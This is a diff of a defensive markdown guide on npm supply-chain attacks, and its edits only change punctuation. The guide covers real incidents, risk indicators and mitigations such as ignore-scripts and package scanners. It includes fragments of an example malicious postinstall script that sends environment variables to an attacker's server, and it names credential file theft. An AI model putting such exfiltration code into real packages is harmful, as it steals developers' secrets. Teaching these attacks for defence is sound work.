@@ -8,7 +8,7 @@
 
 ### 1. Intentionally Malicious Packages
 
-An attacker publishes a new package — often with a name very close to a popular one — that contains malware from day one. The package might even have a legitimate-sounding purpose while also:
+An attacker publishes a new package, often with a name very close to a popular one, that contains malware from day one. The package might even have a legitimate-sounding purpose while also:
 
 - Exfiltrating environment variables (`process.env`) to a remote server
 - Installing a cryptominer
@@ -23,21 +23,21 @@ A legitimate, popular package is taken over after the original maintainer's acco
 - CI/CD pipelines auto-install the latest version
 - `npm audit` won't flag it until a CVE is filed (which takes time)
 
-**Real example — ua-parser-js (October 2021):**
+**Real example: ua-parser-js (October 2021):**
 The npm account for `ua-parser-js` (8 million weekly downloads) was hijacked. Versions `0.7.29`, `0.8.0`, and `1.0.1` were published containing a cryptominer (Linux/macOS) and credential stealer (Windows). Anyone running `npm install` during the ~4-hour window received malware.
 
-**Real example — event-stream (November 2018):**
+**Real example: event-stream (November 2018):**
 The original author of `event-stream` transferred ownership to a new maintainer who had offered to "help maintain" the package. That maintainer added `flatmap-stream` as a dependency, which contained encrypted malicious code specifically targeting the Copay Bitcoin wallet app. The attack was active for ~2 months before discovery.
 
 ### 3. Maintainer Intentional Sabotage
 
-Sometimes the maintainer themselves introduces malicious or destructive behaviour — out of protest, commercial pressure, or mental health crisis.
+Sometimes the maintainer themselves introduces malicious or destructive behaviour: out of protest, commercial pressure, or mental health crisis.
 
-**Real example — colors and faker (January 2022):**
+**Real example: colors and faker (January 2022):**
 Marak Squirrells, the maintainer of `colors` (19 million weekly downloads) and `faker` (2.4 million weekly downloads), deliberately published corrupted versions. `colors` entered an infinite loop printing gibberish, breaking thousands of applications including AWS CDK. He had previously complained about not being compensated for open source work.
 
-**Real example — node-ipc (March 2022):**
-The maintainer added a wiper that deleted files on systems with Russian or Belarusian IP addresses — in protest of the Ukraine war. The package is a dependency of `vue-cli`.
+**Real example: node-ipc (March 2022):**
+The maintainer added a wiper that deleted files on systems with Russian or Belarusian IP addresses: in protest of the Ukraine war. The package is a dependency of `vue-cli`.
 
 ### 4. Malicious `postinstall` Scripts
 
@@ -51,13 +51,13 @@ npm packages can run arbitrary shell commands during installation via `preinstal
 }
 ```
 
-The `install.js` file — which you probably haven't read — might be doing anything.
+The `install.js` file, which you probably haven't read, might be doing anything.
 
 ---
 
 ## Risk Indicators
 
-### Red Flags — Investigate Before Installing
+### Red Flags: Investigate Before Installing
 
 | Indicator | Why It's Risky |
 |---|---|
@@ -74,7 +74,7 @@ The `install.js` file — which you probably haven't read — might be doing any
 | **Sudden spike in version numbers** | May indicate account takeover + rushed publish |
 | **Dependencies on obscure sub-packages** | Attack may be in a transitive dep |
 
-### Green Flags — Signs of a Healthy Package
+### Green Flags: Signs of a Healthy Package
 
 | Indicator | What It Signals |
 |---|---|
@@ -92,7 +92,7 @@ The `install.js` file — which you probably haven't read — might be doing any
 
 ### Environment Variable Exfiltration
 
-The most common attack — grab all your secrets at install time:
+The most common attack: grab all your secrets at install time:
 
 ```js
 // Malicious postinstall script
@@ -107,7 +107,7 @@ https.request({
 }, () => {}).end(env);
 ```
 
-This sends your `.env` variables — database URLs, API keys, AWS credentials — to an attacker's server the moment you run `npm install`.
+This sends your `.env` variables, database URLs, API keys, AWS credentials, to an attacker's server the moment you run `npm install`.
 
 ### Credential File Theft
 
@@ -186,15 +186,15 @@ npm audit signatures
 # ~/.npmrc
 audit=true
 fund=false
-ignore-scripts=true  # CI only — breaks some packages locally
+ignore-scripts=true  # CI only: breaks some packages locally
 ```
 
 ### Monitor for Anomalous Behaviour
 
 At runtime, watch for packages making unexpected outbound calls. Use tools like:
-- **Socket.dev** — analyses npm packages for suspicious behaviour before install
-- **Snyk** — vulnerability scanning with supply chain awareness
-- **Semgrep** — static analysis to detect data exfiltration patterns
+- **Socket.dev**: analyses npm packages for suspicious behaviour before install
+- **Snyk**: vulnerability scanning with supply chain awareness
+- **Semgrep**: static analysis to detect data exfiltration patterns
 
 ---
 
